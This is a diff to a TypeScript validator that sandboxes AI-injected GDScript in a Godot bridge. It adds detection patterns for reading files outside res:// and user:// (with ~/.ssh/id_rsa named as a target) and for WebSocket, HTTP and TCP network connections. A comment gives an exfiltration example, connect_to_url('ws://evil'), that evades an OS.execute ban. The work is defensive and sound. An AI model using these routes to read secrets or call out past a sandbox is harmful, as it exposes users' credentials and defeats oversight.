@@ -56,6 +56,13 @@ const DANGEROUS_PATTERNS: Array<{ pattern: RegExp; label: string }> = [
   // C-03: Allow FileAccess.READ, only flag write modes (WRITE / READ_WRITE / READ_WRITE_APPEND)
   // Use [^;]* to match to statement boundary — avoids truncation on ')' in file paths
   { pattern: /FileAccess\.open\s*\([^;]*FileAccess\.(?:WRITE|READ_WRITE|READ_WRITE_APPEND)\b/, label: 'File write access' },
+  // 2026-08-07 审查 P2 修复（决策2 升级版）：默认模式拦 FileAccess.open 读非 Godot 协议路径。
+  // 原 C-03 注释 "Allow FileAccess.READ" 致默认模式放行读任意路径（~/.ssh/id_rsa 等敏感文件），
+  // AI 注入的 GDScript 可读后经 print/_mcp_output 回传。模式对齐 :71 load() 非 res:// 拦截，
+  // 但额外放行 user://（Godot 用户数据目录，存档等合法用途）——只拦绝对路径/~ /.. / 非协议字面量。
+  // 实测内部脚本（godot_operations.gd:815 uid_path 经 _sanitize_res_path）不受影响。
+  // stripLiterals 保留协议前缀（:270-274），骨架层匹配正确。
+  { pattern: /FileAccess\.open\s*\(\s*["'](?!res:\/\/|user:\/\/)/, label: 'File read with non-resource path (information disclosure)' },
   { pattern: /Engine\.(set_singleton)\b/, label: 'Engine singleton modification' },
   // C-03: Engine.get_singleton bypasses class-level restrictions (e.g. FileAccess, DirAccess)
   { pattern: /Engine\.get_singleton\b/, label: 'Engine singleton access (sandbox bypass)' },
@@ -90,6 +97,14 @@ const DANGEROUS_PATTERNS: Array<{ pattern: RegExp; label: string }> = [
   // A-3 (advisory): 去掉 [^)]* 贪婪(原回溯到闭合 " 后检查,那里是 ')' 而非 res://,
   // 致 ResourceLoader.load("res://a.tres") 误报)。对齐 :68 load 设计,单 ["'] 后即查 res://。
   { pattern: /ResourceLoader\.load\s*\(\s*["'](?!res:\/\/)/, label: 'ResourceLoader.load with non-resource path' },
+  // 2026-08-07 审查 P2 修复：网络回连 API 未覆盖。GDScript 可 var ws = WebSocketPeer.new();
+  // ws.connect_to_url("ws://evil") 发起网络回连绕过 OS.execute 禁令实现数据外传/C2
+  // （Thread.new 已拦无法异步，但同步 connect + 主循环 poll 仍可行）。
+  // addon 侧 bridge 用 TCP 不受沙箱约束（沙箱只管 AI 注入脚本）。
+  { pattern: /WebSocketPeer\.(new|create)\b/, label: 'WebSocketPeer creation (network callback)' },
+  { pattern: /HTTPClient\.new\b/, label: 'HTTPClient creation (network callback)' },
+  { pattern: /StreamPeer(TCP|SSL|Object)?\.new\b/, label: 'StreamPeer creation (network callback)' },
+  { pattern: /\.(connect_to_url|connect_to_host)\b/, label: 'Network connect (callback bypass)' },
 ];
 
 /**
@@ -270,7 +285,9 @@ function detectStringConcatBypass(code: string): string[] {
 // C-RES: Godot 资源协议前缀。stripLiterals 剥字符串内容时保留该前缀，使
 // load("res://...") / preload("res://...") 在骨架上仍被 load() non-resource-path
 // 正则的负向预查正确放行。res:// 仅指项目内资源、非危险向量，保留前缀对其他正则无副作用。
-const RES_PROTOCOL = 'res://';
+// 2026-08-07 审查 P2: 加 user://（Godot 用户数据目录，存档等合法用途，同 res:// 安全级别），
+// 让 FileAccess.open("user://...") 在骨架上也被新读拦截规则的负向预查正确放行。
+const GODOT_PROTOCOLS = ['res://', 'user://'] as const;
 export function stripLiterals(code: string): string {
   let result = '';
   let i = 0;
@@ -284,9 +301,13 @@ export function stripLiterals(code: string): string {
       const quote = ch;
       result += quote; // C-RES: 三引号开引号归一化为单个(骨架等价单引号字符串,下游正则统一处理)
       i += 3;
-      if (code.startsWith(RES_PROTOCOL, i)) {
-        result += RES_PROTOCOL; // C-RES: 保留 res:// 前缀
-        i += RES_PROTOCOL.length;
+      // C-RES: 保留 Godot 协议前缀（res:// / user://）
+      for (const proto of GODOT_PROTOCOLS) {
+        if (code.startsWith(proto, i)) {
+          result += proto;
+          i += proto.length;
+          break;
+        }
       }
       while (i < len) {
         if (code.charAt(i) === '\\' && i + 1 < len) {
@@ -308,9 +329,13 @@ export function stripLiterals(code: string): string {
       const quote = ch;
       result += quote; // 保留开引号
       i++;
-      if (code.startsWith(RES_PROTOCOL, i)) {
-        result += RES_PROTOCOL; // C-RES: 保留 res:// 前缀
-        i += RES_PROTOCOL.length;
+      // C-RES: 保留 Godot 协议前缀（res:// / user://）
+      for (const proto of GODOT_PROTOCOLS) {
+        if (code.startsWith(proto, i)) {
+          result += proto;
+          i += proto.length;
+          break;
+        }
       }
       while (i < len) {
         if (code.charAt(i) === '\\' && i + 1 < len) {
